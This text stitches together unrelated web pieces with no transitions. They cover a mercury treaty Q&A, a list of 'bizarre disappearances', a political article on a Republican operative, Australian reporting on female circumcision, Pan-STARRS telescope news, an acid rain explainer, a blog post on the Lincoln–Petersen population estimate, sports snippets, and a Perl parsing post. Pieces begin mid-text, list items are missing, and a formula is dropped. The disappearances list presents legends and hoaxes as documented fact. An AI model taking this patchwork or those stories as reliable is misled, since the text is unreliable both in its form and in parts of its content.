However , this is often one of the most contentious topics of negotiation , and the availability of necessary resources for implementation are often limited as many developing countries argue that industrialized countries do not provide enough support for capacity building .
Another implementation challenge will be coordinating an international mercury treaty with other environmental agreements that already partly cover mercury and other hazardous substances .
The Basel Convention on the Control of Transboundary Movements of Hazardous Wastes and Their Disposal controls the international trade and management of hazardous waste including waste containing mercury .
The Rotterdam Convention on the Prior Informed Consent Procedure for Certain Hazardous Chemicals and Pesticides in International Trade sets out provisions for the import and export of hazardous chemicals , including mercury .
Coordination with these two agreements will be important in addressing the entire life cycle of mercury , including mining and production , use , emission , disposal and cleanup .
Q. How would an international treaty affect developed countries like the U.S. that already regulate mercury emissions ?
How do current laws in the U.S. regarding mercury emissions and use compare to other industrialized nations ?
A. The U.S. regulates mercury emissions from municipal - waste combustion and medical - waste incineration , but does not currently regulate mercury emissions from coal - fired power plants , which are the largest domestic mercury emission source .
This is an area where U.S. regulations should be strengthened ; the EPA is currently developing power - plant emissions standards for mercury .
European countries also have stronger regulations than the U.S. on mercury in many products , including a large number of common electronic goods .
Sweden , for example , has banned mercury in almost all products , but there are some exceptions , including the use of mercury in compact fluorescent light bulbs .
In the U.S. , many efforts to phase out mercury in products are voluntary , although some states have more stringent regulations .
In fact , California has largely copied European Union regulation on mercury and other hazardous substances in electronics , going beyond federal requirements .
For the U.S. , any treaty ratification requires the advice and consent of the Senate .
and must be approved by two - thirds of all senators .
Over the past few decades , this has been an obstacle for U.S. participation in many multilateral environmental agreements .
As a result , the U.S. has not ratified several important environmental treaties , including the Basel and Rotterdam conventions .
Domestic politics is likely to be a continuing challenge for U.S. implementation of environmental regulations and international cooperation on mercury , and it is not a given that the U.S. would become a party to a mercury treaty .
History is peppered with intriguing tales of people who , for all intents and purposes , inexplicably vanish from the face of the earth without a trace .
These stories – some of the most fascinating in the annals of the unexplained – vary from being well - documented to having the flavor of mere legend and folklore .
This is the top 10 bizarre disappearances .

10 The Disappearance Of Oliver Larch
The story of Oliver Larch ( Sometime known as Lerch or Thomas ) follows a similar narrative to that of David Lang ( item 3 ) .
According to his narrative , Larch was on his way to collect water from a well one winter when he vanished ; leaving nothing behind but trail of footprints in the snow which terminated abruptly , and a series of cries for help that appeared to come from above .
In some tellings , Larch ’s story is set in late nineteenth - century Indiana , in others , it is set in North Wales .
One particular recurring citation of this variant was as Oliver Thomas of Rhayader , Radnorshire , mid-Wales and the date is given specifically as 1909 .

In December 1900 , three lighthouse keepers vanished from their duty stations , leaving behind equipment important to surviving the hostile conditions at that location and time of year .
Despite exhaustive searches , the keepers were never found .
The official explanation for the disappearances is that the men were swept out to sea by a freak wave .

Between 1920 and 1950 , Bennington , Vermont was the site of several completely unexplained disappearances :
On December 1 , 1949 , Mr. Tetford vanished from a crowded bus .
Tetford was on his way home to Bennington from a trip to St. Albans , Vermont .
Tetford , an ex-soldier who lived in the Soldier ’s Home in Bennington , was sitting on the bus with 14 other passengers .
They all testified to seeing him there , sleeping in his seat .
When the bus reached its destination , however , Tetford was gone , although his belongings were still on the luggage rack and a bus timetable lay open on his empty seat .
Tetford has never returned or been found .
On December 1 , 1946 , an 18 - year - old student named Paula Welden vanished while taking a walk .
Welden was walking along the Long Trail into Glastenbury Mountain .
She was seen by a middle - aged couple that was strolling about 100 yards behind her .
They lost sight of her when she followed the trail around a rocky outcropping , but when they rounded the outcropping themselves , she was nowhere to be seen .
Welden has not been seen nor heard from since .
In mid-October , 1950 , 8 - year old Paul Jepson disappeared from a farm .
Paul ’s mother , who earned a living as an animal caretaker , left her small son happily playing near a pig sty while she tended to the animals .
A short time later , she returned to find him missing .
An extensive search of the area proved fruitless .
7 The Vanished Cripple
Owen Parfitt had been paralyzed by a massive stroke .
In June , 1763 in Shepton Mallet , England , Parfitt sat outside his sister ’s home , as was often his habit on warm evenings .
Virtually unable to move , the 60 - year - old man sat quietly is his nightshirt upon his folded greatcoat .
Across the road was a farm where workers were finishing their workday by pooking the hay .
At about 7 p.m. , Parfitt ’s sister , Susannah , went outside with a neighbor to help Parfitt move back into the house , as a storm was approaching .
But he was gone .
Only his folded greatcoat upon which he sat remained .
Investigations of this mysterious disappearance were carried out as late as 1933 , but no trace or clues to Parfitt ’s fate were ever uncovered .
6 The Disappearing Diplomat
British diplomat Benjamin Bathurst vanished into thin air in 1809 .
Bathurst was returning to Hamburg with a companion after a mission to the Austrian court .
Along the way , they had stopped for dinner at an inn in the town of Perelberg .
Upon finishing the meal , they returned to their waiting horse - drawn coach .
Bathurst ’s companion watched as the diplomat stepped over to the front of the coach to examine to horses – and simply vanished without a trace .
5 Time Tunnel
In 1975 , a man named Jackson Wright was driving with his wife from New Jersey to New York City .
This required them to travel through the Lincoln Tunnel .
According to Wright , who was driving , once through the tunnel he pulled the car over to wipe the windshield of condensation .
His wife Martha volunteered to clean off the back window so they could more readily resume their trip .
When Wright turned around , his wife was gone .
He neither heard nor saw anything unusual take place , and a subsequent investigation could find no evidence of foul play .
Martha Wright had just disappeared .
4 The Norfolk Regiment
Three soldiers claimed to be witnesses to the bizarre disappearance of an entire battalion in 1915 .
They finally came forward with the strange story 50 years after the infamous Gallipoli campaign of WWI .
The three members of a New Zealand field company said they watched from a clear vantage point as a battalion of the Royal Norfolk Regiment marched up a hillside in Suvla Bay , Turkey .
The hill was shrouded in a low - lying cloud that the English soldiers marched straight into without hesitation .
They never came out .
After the last of the battalion had entered the cloud , it slowly lifted off the hillside to join other clouds in the sky .
When the war was over , figuring the battalion had been captured and held prisoner , the British government demanded that Turkey return them .
The Turks insisted , however , that it had neither captured not made contact with these English soldiers .
3 The Legend Of David Lang
This famous case allegedly took place in September , 1880 on a farm near Gallatin , Tennessee in full view of several witnesses .
The two Lang children , George and Sarah , were playing in the front yard of the family home .
Their parents , David and Emma , came out the front door , and David headed off across a pasture toward his horses .
At this time , a buggy carrying family friend Judge August Peck was approaching .
David turned to walk back to the house , saw the buggy and waved to the judge as he strode across the field .
A few seconds later , David Lang – in clear view of his wife , his children and the judge – disappeared in mid-step .
Emma screamed and all of the witnesses rushed to the spot where David once was , thinking perhaps he had fallen into a hole of some kind .
There was no hole .
A thorough search by the family , friends and neighbors turned up nothing .
A few months after the unexplained disappearance , the Lang children noticed that the grass on the spot where their father vanished had turned yellow and wilted in a circle measuring about 15 feet in diameter .
2 The Stonehenge Disappearance
The mysterious standing stones of Stonehenge in England was the site of an amazing disappearance in August , 1971 .
At this time Stonehenge was not yet protected from the public , and on this particular night , a group of “ hippies ” decided to pitch tents in the center of the circle and spend the night .
They built a campfire , lit several joints of pot and sat around smoking and signing .
Their campout was abruptly interrupted at about 2 a .m. by a severe thunder storm that quickly blew in over Salisbury Plain .
Bright bolts of lightning crashed down on the area , striking area trees and even the standing stones themselves .
Two witnesses , a farmer and a policeman , said that the stones of the ancient monument lit up with an eerie blue light that was so intense that they had to avert their eyes .
They heard screams from the campers and the two witnesses rushed to the scene expecting to find injured – or even dead – campers .
To their surprise , they found no one .
All that remained within the circle of stones were several smoldering tent pegs and the drowned remains of a campfire .
The hippies themselves were gone without a trace .
1 The Village That Disappeared
An individual that vanishes is one thing , but how about an entire village of 2,000 men , women and children ?
In November , 1930 , a fur trapper named Joe Labelle made his way on snow shoes to an Eskimo village on the shores of Lake Anjikuni in northern Canada .
Labelle was familiar with the village , which he knew as a thriving fishing community of about 2,000 residents .
When he arrived , however , the village was deserted .
All of the huts and storehouses were vacant .
He found one smoldering fire on which there was a pot of blackened stew .
Labelle notified the authorities and an investigation was begun , and which turned up some bizarre findings : no footprints of any of the residents were found , if they had vacated the village ; all of the Eskimos ’ sled dogs were found buried under a 12 - foot - high snow drift – they had all starved to death ; all of the Eskimos ’ food and provisions were found undisturbed in their huts .
And there was one last unnerving discovery : the Eskimos ’ ancestral graves had been emptied .

Meet Charles Hurth III .
The Missouri lawyer has a long history of setting up under - the - radar groups to help Republican operatives game elections .
But the most sordid thing about Hurth ’s past is not his political scheming .
He ’s also what you might call a serial butt - biter , with a well - publicized track record of sinking his teeth into the rumps of college coeds .
He recently struck again in Texas — not by biting derrieres , but by spearheading an apparent GOP dirty trick to derail a Democrat ’s gubernatorial bid .
Last month , Hurth and two other GOP operatives — one a former top aide to Texas Gov. Rick Perry — were implicated in a scheme to bankroll a petition drive to put the Green Party on the ballot .
It is an apparent ploy to siphon votes away from Perry ’s Democratic challenger , former Houston Mayor Bill White .
He ’s an appealing target :
Tied with Perry in the latest poll , White ’s the strongest gubernatorial contender that Texas Democrats have seen in years .
But Hurth ’s first claim to fame was being sued in 1987 for approaching a fellow law student in a bar and biting her on the buttocks so hard that she required medical attention .
During the trial , Hurth admitted that he ’d used the same toothy overture to approach two other women at fraternity parties — and he said that his latest victim should have taken the gesture as a compliment .
The jurors did n’t buy it , and Hurth was successfully sued for $ 27,500 .
Since then , he has dedicated himself to being a persistent pain in the butt for Democrats , setting up shop in a tiny Missouri town to create a clearinghouse for Republican electoral schemes .
The latest came this spring , when Hurth and his allies succeeded in getting the Greens on the 2010 ballot .
In response , the Texas Democratic Party filed a lawsuit in early June against a Hurth - run nonprofit called Take Initiative America , as well as Arizona - based GOP consultant Tim Mooney and “ unknown conspirators ” for their role in the effort .
Mooney has admitted that he funneled money through Hurth ’s organization to pay Free and Equal Inc. , a Chicago - based petition - gathering company that ended up amassing 92,000 signatures for the Texas Green Party ’s ballot drive .
According to a court document , Hurth ’s group spent $ 532,500 on the effort .
Mooney has repeatedly refused to say where the money came from — and denies that it was a GOP plot to bring down White .
“ Take Initiative America is a nonpartisan organization , ” he told the Dallas Morning News , which first broke the news of his involvement .
“ They ’d like to see everybody have a chance to get on the ballot — the more choices the better . ”
Especially if those choices draw votes away from Democratic candidates .
This is n’t the first time that Mooney and Hurth have resorted to such schemes to help Republicans at the polls .
In 2004 , Hurth set up an organization called Choices for America that furtively solicited help from Republicans to get then - presidential candidate Ralph Nader on the ballot in New Hampshire , Nevada , and Pennsylvania , among other states .
Mooney assisted with Hurth ’s 2004 effort , along with Dave Carney , George H.W. Bush ’s former political director who ’s now one of Rick Perry ’s top consultants .
At the time , Carney acknowledged to the Dallas Morning News that he was trying to gather signatures for Nader in order to help George W. Bush get reelected .
According to the script for the petition drive , canvassers were instructed to tell Bush supporters , “ Without Nader , Bush would not be president . ”
Three years later , Hurth undertook yet another effort to manipulate electoral politics to the Republicans ’ advantage .
In 2007 , Take Initiative America funded a California ballot initiative that would have distributed the state ’s 55 electoral votes by congressional district instead of winner - takes - all .
Had it succeeded , the effort would have greatly benefited Republican presidential contenders in the state .
Hurth similarly refused to reveal the donor behind the effort , who finally came forward after Democrats accused the group of money - laundering and California officials vowed to investigate .
Paul Singer , a hedge - fund manager and major Giuliani fundraiser , admitted that he gave $ 175,000 to the effort .
( Hurth himself contributed $ 2,000 to Giuliani ’s presidential bid . )
Then - Democratic National Committee Chair Howard Dean decried the initiative and pointed the finger at the Giuliani campaign , which denied any involvement .
The Perry campaign has similarly denied any role in this year ’s Green Party ploy .
But the tentacles of the scandal reach dangerously close to his camp .
It was allegedly Perry ’s former chief of staff , Mike Toomey , who approached a 22 - year - old college student , Garrett Mize , to talk to the Green Party about accepting the outside help , according to Mize ’s court testimony .
( Toomey , who ’s now a lobbyist , also helped mastermind former Rep .
Tom DeLay ’s scheme to funnel secret corporate money to help the GOP ’s redistricting effort in 2003 . )
The Texas Green Party eagerly accepted the offer — even though a court - released email between Green Party officials reveals that party officials were acutely aware the money could be coming from Republican sources .
The email also mentions Perry ’s top political consultant Anthony Holm as being interested in paying for 40 percent of the party ’s petitioning costs , though he ’s since denied any role in the schme .
The Texas Green Party has refused to withdraw from the ballot , saying it was “ misled ” about the kind of money that was used to fund GOP ’s scheme .
“ It ’s not like we intentionally did this , ” said Kat Swift , statewide coordinator for the Texas Green Party , at a press conference in early July .
According to her account , the Texas Greens never knew what Take Initiative America really stood for or who might be involved .
But Swift has since embraced the GOP help as a form of realpolitik , arguing that Texas has some of the most stringent requirements for getting on the ballot in the country .
“ Wherever the money came from does n’t bother me , ” she told the Dallas Morning News .
“ People are trying to open the ballot to increase democracy and so , who cares how they vote ? ”
It ’s unclear , though whether the Green Party ’s presence on the ticket will actually hurt White ’s chances , as the recent controversy has divided Green Party supporters .
Some of its closest allies have turned against the party for knowingly accepting the GOP assistance — and refusing to back out even after discovering it was paid for by Hurth ’s nonprofit corporation ( which qualifies , for the purposes of campaign - finance law , as corporate money ) .
The Texas League of Conservation Voters , which has often backed Green Party candidates , said the party ’s “ use of corporate , out - of - state money directed from partisan operatives for a petition drive corrupts and manipulates the electoral process . ”
One local Green Party candidate for Travis County Clerk has already withdrawn his candidacy , citing his opposition to the Green Party ’s acceptance of corporate - funded help — even though the party itself has called for the end of corporate funding in all elections .
Texas Democrats , for their part , have given up their push to keep the Green Party off the ballot : they dropped part of their lawsuit last week after the ( all - Republican ) Texas Supreme Court decided to let the Green Party remain on the ballot while it reviewed the case .
But the state ’s Democratic party says it will continue with a legal challenge in a lower court to discover who was funding the GOP - backed petition drive , contending that the source and use of Hurth ’s funds might have been illegal .
If even more incriminating evidence surfaces , the Green Party scheme could really end up biting the Texas GOP in the butt .
A former commonwealth sex discrimination commissioner has called for the prosecution of any Australian involved in the circumcision of young girls , saying the procedure is another form of child abuse .
Former commissioner and current state Liberal MP , Pru Goward , called for action following revelations some doctors are considering introducing a controversial form of genital mutilation .
The Royal Australian New Zealand College of Obstetricians and Gynaecologists ( RANZCOG ) says the practice of " ritual nicks " could meet the cultural needs of some women and potentially save some people from drastic surgery .
Although illegal in Australia , female circumcision is common among some African , Asian and Middle Eastern communities but has been known to leave some young girls scarred for life when not carried out in proper clinical facilities .
Ms Goward said that instead of softening our approach , authorities should begin prosecuting any family who carries out the procedure on its daughter .
She said she does n’t believe any Australian doctor currently performs the procedure and there are no known prosecutions of any doctor or parent for carrying out the practice .
" This is child abuse , it does n’t matter whether it is cultural or not , it is against the law and there is one law for all Australians , " she said .
" The law said it is seven years jail and of course it should not be allowed .
There is anecdotal evidence that it is occurring , doctors have brought it to me when I was commissioner , they raised to me that there were cases ... and when I said to them why are n’t they reporting them it was because they feel it would n’t stand it up in court .
" Doctors are anxious about taking on the family because the family will often just say the ' young girl slipped on some glass ' . "
Ms Goward said using the " Neville Chamberlain " approach and finding a compromise on the issue would " be unacceptable to most Australians " .
She also said public hospitals " need to find some bottle " and report any suspected circumcision cases .
‘‘ I think the Federal Government needs to have an education campaign as part of our immigration program , and if you are introducing people from other countries where you know it goes on , you need to let them know it is unlawful and it is not acceptable . ’’
RANZCOG secretary Gino Pecoraro said the issue would be discussed at a women ’s health meeting in June .
" We will need to start to think about [ its introduction ] but we would have to speak to community leaders from Australia , " he said .
" But we need to make sure we do not legitimise the ritualistic maiming of children . "
Elizabeth Broderick , Sex Discrimination Commissioner for the Australian Human Rights Commission said : " I disagree with the suggestion by the RANZCOG that we should , for any reason , entertain a practice of " ritual nicks " in a sterile environment .
Speaking out ... Pru Goward .

The telescope is relatively small , but incorporates cutting edge technology
A new telescope facility in Hawaii designed to search for asteroids and comets which could threaten Earth has been made operational .
The Pan -STARRS 1 telescope will map large portions of the sky each night to track not only close space objects , but also exploding stars ( supernovae ) .
The telescope has been taking science data for six months but is now operating from dusk - dawn each night .
Pan -STARRS 1 ( PS1 ) is expected to map one - sixth of the sky every month .
The facility boasts a huge digital camera : a 1,400 megapixel ( 1.4 gigapixel ) device that can photograph an area of the sky as large as 36 full Moons in a single exposure .
These data will help us understand the life cycles of galaxies Prof Carlos Frenk , Durham University
" Although modest in size , this telescope is on the cutting edge of technology , " said Dr Nick Kaiser , head of the Pan - STARRS project .
The giant digital camera will take over 500 exposures each night , collecting about four terabytes of data ( equivalent to what 1,000 DVDs can hold ) .
By casting a wide net , the telescope is expected to catch many moving objects within our Solar System .
Frequent follow - up observations will allow astronomers to track those objects and calculate their orbits , identifying any potential threats to Earth .
In January this year , a report by the US National Research Council said the country must do more to tackle the asteroid threat .
Professor Carlos Frenk , from Durham University , who is the UK's member on the Pan - STARRS board , said : " PS1 will generate the largest ever multi-colour survey of the cosmos .
" Alongside supercomputer simulations of the universe , these data will help us understand the life cycles of galaxies and , if we are very lucky , the nature of the mysterious dark matter and dark energy that control the evolution of our cosmos . "
The 1.8 m ( 60 - inch ) diameter telescope on Haleakala will also spot many small , faint bodies in the outer Solar System that hid from previous surveys .
PS1 is the experimental prototype for a larger telescope to be built called PS4 , which will have four times the power of PS1 and is planned for Mauna Kea in Hawaii .

Can acid rain go through anything ?
Why ?
How ?
Acid rain not only kills off plants and animals by poisoning forests and lakes , but it also slowly eats away many man-made structures such as buildings and bridges .
Highly populated areas in the Northern Hemisphere were so badly polluted by acid rain in the ' 70s and ' 80s that it caused a reduction of plant and animal diversity , says Dr Greg Ayers , director of the Australian Bureau of Meteorology .
" There were some regions where thousands of small lakes became devoid of life altogether , says Ayres , who studied the effects of acid rain while the head of CSIRO Marine and Atmospheric Research during the ' 80s and '90s .
" Acid rain has also been blamed for eating away parts of sandstone buildings and statues by dissolving the calcium carbonate matrix that binds the silicates of the sandstone together .
This can happen in just 10 or 20 years .
" And it 's caused modern - day metal structures to degrade more quickly , forcing engineers to use stainless steel instead of normal steel to keep bridges safe .
In some parts of China , acid rain causes galvanized rubbish bins to rust through so quickly , they only last a few years . "
And in Sweden and Norway , corrosion of copper pipes by acid rain even turned some people 's hair a blueish - green tinge .
^ to top
Chemical make up
Acid rain is composed mostly of sulphuric and nitric acid .
Both are common substances in the natural environment , occurring in trace amounts in the atmosphere because of trace gases containing sulphur and nitrogen being oxidised by sunlight , especially ultraviolet light .
" In fact they can even provide the seeding for rain droplets .
" But when human activities like industry and transport emit large quantities of sulphur and nitrogen through things like the burning of coal and oil , the natural cycle becomes swamped by the these chemicals and acid rain becomes a real problem .
" Work by governments in more recent times has seen a drop in sulphur emissions and a stabilisation of nitric acid levels , even though populations have continued to grow , " says Ayres .
Acid rain levels are low in most of Australia compared to other parts of the world .
" That 's mainly because of our sparse population and widely separated emission sources .
And because Australian coal is very low in sulphur , up to a factor of five lower than overseas coal , " says Ayres .
" Interestingly however , readings taken in the Northern Territory at places like Kakadu National Park produce very high levels of acid rain at the start of each wet season .
" These levels are as acidic as parts of the Northern Hemisphere , but are caused naturally by emissions from native tropical plants , rather than through any sort of human activities . "

Acid rain and people
According to the CSIRO , normal unpolluted rain water should have a pH value of about 5 and tap water should be around 7 .
Any measurement under 5 is considered acid rain .
Ayres says the levels of acid rain deposited into lakes and rivers , is still relatively low by the standards of acidity in the human gut , or in some of the foods we eat .
" It 's about as strong as the acidic acid in vinegar .
You would n't water your plants with it , but it 's not bad enough to hurt humans . "

Gotta be something with content .
How I love to go out hunting on a bright Sunday morning — though it ’s not my style to shoot furry / feathery / finny animals .
My game is to get up early and stalk a wily factoid .
A posting from Mat Roberts , whose blog I ’ve recently discovered , sent me out this morning to chase down a passage in How Long Is a Piece of String , a book by Rob Eastaway and Jeremy Wyndham :
The concept here seemed familiar , but the term “ Lincoln Index ” was new to me .
Lincoln who ?
What index ?
Google offered some useful clues .
( Also a generous helping of false scents — books about Honest Abe that happen to have an index . )
Without even clicking on a link I had the general context :
The Lincoln Index provides a way to measure population sizes of individual animal species .
It is based on a capture / mark / recapture method …
So we ’re talking ecology and population biology .
The original idea was not to catch the same typo twice but to catch the same furry / feathery / finny creature twice .
Interesting .
However , the first couple of web pages that Google sent me to ( here and here ) told me nothing about Lincoln .
And , oddly , I found no Wikipedia entry for “ Lincoln Index . ”
If it ’s not in Wikipedia , does it exist ?
With a little more poking around , I stumbled upon another clue that seemed promising : a mention of “ the Lincoln - Pearson equation for estimating population size . ”
I was still in the dark about Lincoln , but Pearson is quite a familiar figure .
Surely that ’s Karl Pearson , the pioneering statistician , who did much of his work in the biological sciences and might very well have come up with a scheme for estimating population sizes .
Back at Google , though , searching for “ Lincoln - Pearson ” turned up nothing pertinent other than the page I ’d come from ( though I did learn that Karl Pearson “ read in chambers in Lincoln ’s Inn ” during his early years studying law ) .
More beating the bushes .
Eventually I realized I had wandered into a blind alley .
Somebody needs to hire a pair of proofreaders :
The formula is not “ Lincoln - Pearson ” but “ Lincoln - Petersen . ”
Try those names at Google and you ’ll get an abundance of useful pointers .
( You ’ll also learn that Abraham Lincoln died in Petersen ’s Boarding House , across the street from Ford ’s Theater .
Google is not just a search engine but also a coincidence engine . )
The particular web page where I finally got the correct names ( notes for a course at North Carolina State University ) explains that capture - mark - recapture methods
are used extensively to estimate populations of fish , game animals , and many non -game animals .
The approach was first used by Petersen ( 1896 ) to study European plaice in the Baltic Sea and later proposed by Lincoln ( 1930 ) to estimate numbers of ducks .
Petersen ’s and Lincoln ’s method is often referred to as the Lincoln - Petersen Index , even though it is not an index but a method to estimate actual population sizes .
( Should it not be the Petersen - Lincoln Estimate ? )
I decided to pursue Petersen first — and immediately ran into a few further bibliographic brambles .
Some citations spell the name “ Petersen ” and others “ Peterson . ”
Some give the initials “ C. G. T. ” and others “ C. G. J. ” or “ C. J. G. ”
The date might be 1895 or 1896 or 1897 .
Here ’s what I believe to be a correct citation :
Petersen , C. G. J. 1896 .
The yearly immigration of young plaice into the Limfjord from the German Sea .
Report of the Danish Biological Station to the Home Department 6:1–48 .
Wikipedia identifies our elusive author as Carl Georg Johannes Petersen ( 1860 -1928 ) .
He was a founder of the Danish Biological Station , which was not in fact a station but a mobile laboratory — a decommissioned naval vessel that was moved around from year to year .
In 1895 , Petersen took the station to the Limfjord , a chain of bays , lakes and channels cutting across the Jutland peninsula in northern Denmark .
There he studied the plaice fishery .
( Back to Wikipedia : “ The European plaice is a right - eyed flounder belonging to the Pleuronectidae family . ”
But let ’s not get started on right - eyed and left - eyed flatfish , or we ’ll never get to the end of this . )
Petersen ’s report is available online , scanned from a copy belonging to the library of the Marine Biological Laboratory and Woods Hole Oceanographic Institution , and hosted by the Biodiversity Heritage Library of the Internet Archive .
A second surprise :
The report is written in English .
But on reading through it I find only vague and murky connections between the work Petersen reports and the mark - recapture method of estimating populations .
There ’s nothing resembling the E 1 E 2 /S formula .
Petersen does describe a series of capture / mark / recapture experiments .
A few hundred plaice were caught and marked by attaching numbered buttons , then put back in the water .
Fishermen who recaught the labeled fish in later months were asked to report them .
But the purpose of this study was not to estimate the total population ; instead , Petersen used before - and - after measurements of the marked fish to estimate their growth rate .
In a much larger experiment , some 82,580 plaice ( somebody must have counted them ! ) were transplanted into the fjord , and 10,900 of the fish were marked by having a hole punched in their dorsal fin .
The number of marked fish was recorded as the plaice were caught during the coming year .
It ’s not clear whether the aim of this project was to estimate the total population , but in any case it did n’t work .
The fraction of marked fish in the transplanted batch was about 1/7 , but the marked fraction in the subsequent catches was 1/5 .
Petersen remarks , “ This result is very strange , ” and I have to agree .
When Petersen did try to estimate the plaice population , he did n’t rely on a recapture scheme .
He went out with seine nets designed to dredge up every bottom fish in a measured plot , then extrapolated from the density of fish per unit area .
The whole report is fascinating fishy stuff , but it leaves me wondering just how Petersen came to be given credit for the resampling idea .
As far as I can tell , it ’s not to be found in this paper .
Having chased down Petersen , I turned back to Mr. Lincoln .
Without much trouble I was able to identify the work in question :
Lincoln , F. C. 1930 .
Calculating waterfowl abundance on the basis of banding returns .
United States Department of Agriculture Circular 118:1–4 .
The author was Frederick C. Lincoln , who was bird - bander - in - chief in the U.S. for some 25 years .
The agency he founded has since migrated from the Department of Agriculture to the U.S. Geological Survey and become the Bird Banding Laboratory .
Google returns hundreds of works that cite Lincoln ’s paper ( including some quite far afield from population biology ) .
But tracking down the USDA document itself was not so easy .
If the USDA has it online , I was n’t able to locate it .
But a search of WorldCat eventually turned up an archive in the Hathi Trust Digital Library where you can page through Lincoln ’s pamphlet in a copy scanned by Google at the University of Minnesota library .
Lincoln gives only a brief and informal account of the recapture idea , but the basic principle is stated clearly enough :
If in one season 5,000 ducks were banded and yielded 600 first - season returns , or 12 percent , and if during that same season the total number of ducks killed and reported by sportsmen was about 5,000,000 , then this number would be equivalent to approximately 12 per cent of the waterfowl population for that year , which would be about 42,000,000 .
It ’s not hard to translate this formula from the language of duck hunters into the language of proofreaders .
The first reader finds 5,000 typos and the second spots 5 million ; 600 of these errors are common to both lists , and so the total number of typos is :
So that ’s my reward for a morning spent out hunting : 42 million typos .
Does Frederick Lincoln deserve credit for the Lincoln Index ?
I ’d say he has a good claim , except that Pierre Simon de Laplace had the same idea more than a century earlier .
In 1802 Laplace applied his method to estimating the ( human ) population of France .
But maybe that ’s a story for another Sunday morning .
Epilogue .
This is not really a story about typos , or about fish and ducks .
It ’s about finding things — about the phenomenal ease of chasing facts on the world wide web .
Does a marked fish have any hope of escaping recapture there ?
Ken Griffey Jr. Retires at Age 40 ( Pic )
After many years of battling through years of injuries , Griffey finally calls it quits .
Cesc Fábregas said nothing should be read into him wearing a Barcelona shirt during Spain 's World Cup celebrations .
The Arsenal captain has long been linked with a return to the club where he spent six years as a youth team player before moving to north London in 2003 , and Barcelona have had a € 35 m ( £ 29 m ) bid turned down this summer .
The Barça defenders Carles Puyol and Gerard Piqué – helped by the Liverpool goalkeeper Pepe Reina – added to the speculation by putting a Barcelona shirt over their Spain team - mate 's head as they celebrated their triumphant return to Madrid on Monday .
But Fábregas has laughed it off , saying nothing should be read into a practical joke on a night of high spirits in which Piqué was caught on camera spitting at a member of Spain 's coaching staff .
" These are things that happen at special moments , and I do n't think it should be gone on about much more because it was just another anecdote of a great night , a great celebration , " the Arsenal midfielder said .
" There are times we do not even know what we do , so everything can be forgiven .
Pepe took me there [ to the front of the stage ] , and the truth is that I did n't know anything like that was going to happen and so I was a bit surprised .
At first I thought it was a flag or something , but it 's nothing .
You had to enjoy it and if it 's a way to have fun , it 's nothing . "
Fábregas grew slightly more serious when questioned further about where he will be playing next season .
" I think now the less said about the subject the better , because these things are worse for everyone when they come to light and people talk more about the matter .
Right now we have to be very calm and what will be will be . "
Barcelona 's Andrés Iniesta has said he hopes Fábregas joins him at the club .
" Everybody has come out and spoken of the desire we have for him to be with us next season .
We would be delighted .
Not just because he is a team - mate and a friend , but because it would be great for the club .
" His arrival would give us a huge jump up in quality and he would play his part to help us stay up there competing in the big competitions .
We would love him to be here . "
The Garden Path
In Perl 5.10 , the following code is a syntax error :
{ 42;{1,2,3;4}}
syntax error at ( eval 25 ) line 1 , near " ; 4 " syntax error at ( eval 25 ) line 1 , near " }}
If you try it , what you 'll see is something like this :
TPP is based on an algorithm called LALR .
( To avoid confusion when discussing various programs which parse Perl , I will call the one that comes with the Perl distribution the Tradition Perl Parser , or TPP . )
If you look at perly.y , you will find a real achievement in LALR parsing .
and therefore in computer language parsing in general .
But LALR has its limits and even in the TPP these show up every now and then .
Let 's call our first example the Garden Path Code Block .
What is happening here ?
Perl is being taken " down the garden path " between the inner set of curly braces .
TPP starts out down the path and , based on what it sees , decides that it is parsing an anonymous hash .
TPP commits to that choice and then trainwrecks on the semicolon .
PPI does no better .
PPI recognizes the Garden Path Code Block , but it parses it as an anonymous hash , which is wrong .
I am prototyping a new Perl syntax analyzer using Marpa , my new parser .
Marpa parses anything you can write in BNF , using ideas based on those by Jay Earley .
Marpa :: Perl is still a prototype , but it has no difficulty in recognizing the Garden Path Code Block as a code block .
LALR 's problem is that it is based on a state machine .
LALR 's state machine ran at speeds and used memory in keeping with the computer technology of 1969 , which is when LALR was invented .
But the LALR state machine needs to make decisions based on limited context .
When the LALR parser in perly.y sees that semicolon , it is pretty much game over .
LALR has always been a tight squeeze for the grammars of practical programming languages .
This is despite the fact that LALR has had decades to condition language designers to accept its idea of what " practical " means in a programming language .
For Marpa , the Garden Path Code Block is not even a serious challenge .
Marpa is based on Jay Earley 's ideas .
These were the subject of my last post .
Briefly , the core idea is to create a table of " Earley items " .
Earley items are short records indicating parsing progress , keyed to locations in the input .
For an Earley - based parser , a " garden path " is dealt with by having Earley items record the multiple possibilities .
This need to deal with alternative possibilities is not dissimilar to the one which motivates other parsers to use more expensive strategies , such as backtracking or parallel processing .
What the Man Page Says
{ 42 ;{1,2,3,4}}
{ '1 ' => 2, '3 ' =>
4}
Suppose we go all the way down the " garden path " , and it still is not clear whether the curly braces enclose an anonymous hash or a code block ?
If we alter our example to replace the deadly semicolon with an insidious comma , this is what it looks like :
And for Perl 5.10 , this is the result : PPI seems to agree with Perl 5.10 .
Marpa :: Perl , on the other hand , sees that this code is ambiguous .
It recognizes two parses .
The first parse is the one Perl and PPI see : an anonymous hash .
Marpa :: Perl 's second parse treats both sets of curlies as surrounding code blocks .
In scalar context , the value which results from this second parse is the number 4 .
In cases of desperation , we look at the documentation .
It takes some searching to find it , but there is a very relevant discussion in a section of the perlref man page .
It is worth reading .
Of its several examples , this is the most interesting :
sub showem { { @_ } } # ambiguous ( currently ok , but may change )
{ @_ }
Here Perl 's rules of thumb result in the " " being parsed as a code block -- the opposite of the behavior in our previous example .
The threat made in the comment -- that TPP 's current behavior may change -- would be a hard thing to make good on .
Assuming array context , the effect of having the perlref example flip semantics would be to change the return value from an array into a hash ref .
That kind of silent change is not the kind of thing I like to see in production code .
Most Perl programmers are probably not aware of this gotcha .
Even well - informed programmers can easily write ambiguous code by accident , and will receive no warning of their mistake .
Perhaps a good application for Marpa : : Perl would be spotting ambiguities like these .
How to Disambiguate
Once spotted , ambiguous curlies are easy to fix .
A standard way to disambiguate an anonymous hash is to prefix the curly braces with a plus sign :
{ 42 ;+{1,2,3,4}}
TPP , PPI and Marpa : : Perl have no trouble recognizing that the inner curly brackets enclose an anonymous hash in the above .
A programmer can disambiguate code blocks by placing a semicolon as the first thing inside the curly brackets .
{ 42 ; {;1,2,3;4}}
The inner curlies in the above are recognized as defining a code block by all three parsers : TPP , PPI and Marpa : : Perl .

